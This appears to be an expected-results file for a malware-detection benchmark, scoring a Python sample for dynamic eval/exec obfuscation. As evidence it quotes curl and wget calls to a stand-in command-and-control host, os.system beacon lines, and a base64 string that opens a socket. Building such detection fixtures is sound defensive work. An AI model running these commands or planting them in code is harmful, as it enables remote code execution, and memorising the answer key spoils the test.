@@ -1,0 +1,62 @@
+{
+  "sample_id": "adv-025-eval-exec",
+  "test_category": "dynamic_code_obfuscation",
+  "benchmark_marker": "BENCHMARK_TEST_ONLY",
+  "expected_detections": [
+    {
+      "detection_id": "DYNAMIC-001",
+      "detection_name": "Python eval/exec usage",
+      "description": "Direct use of eval() and exec() with compile() to execute arbitrary code strings",
+      "severity": "critical",
+      "confidence": 0.95,
+      "evidence": [
+        "exec(compile(source_code, '<string>', 'exec'))",
+        "eval(compile(payload, '<eval>', 'eval'))",
+        "exec(compile(full_cmd, '<string>', 'exec'))"
+      ]
+    },
+    {
+      "detection_id": "OBFUSC-003",
+      "detection_name": "Base64 encoded payload",
+      "description": "Base64 encoding used to hide malicious payload content",
+      "severity": "high",
+      "confidence": 0.90,
+      "evidence": [
+        "base64.b64decode(rules_string).decode('utf-8')",
+        "encoded_payload = \"aW1wb3J0IHNvY2tldDsgcz1zb2NrZXQuc29ja2V0KCk=\""
+      ]
+    },
+    {
+      "detection_id": "EXFIL-002",
+      "detection_name": "Command and control beacon",
+      "description": "Attempts to contact external C2 server",
+      "severity": "critical",
+      "confidence": 0.92,
+      "evidence": [
+        "curl https://[REDACTED].example.com/beacon",
+        "wget https://[REDACTED].example.com/payload"
+      ]
+    },
+    {
+      "detection_id": "EXEC-001",
+      "detection_name": "System command execution",
+      "description": "os.system() used to execute shell commands",
+      "severity": "critical",
+      "confidence": 0.95,
+      "evidence": [
+        "os.system('curl https://[REDACTED].example.com/beacon')",
+        "__import__(\"os\").system(...)"
+      ]
+    }
+  ],
+  "obfuscation_techniques": [
+    "String concatenation to build commands",
+    "Base64 encoding of payloads",
+    "compile() to create code objects",
+    "Dynamic __import__ usage"
+  ],
+  "risk_score": 9.5,
+  "verdict": "确认恶意",
+  "verdict_reasoning": "Multiple layers of dynamic code execution (eval/exec/compile) combined with encoded payloads and external C2 communication. Clear intent to execute arbitrary remote code while evading static analysis.",
+  "recommended_action": "block_and_alert"
+}
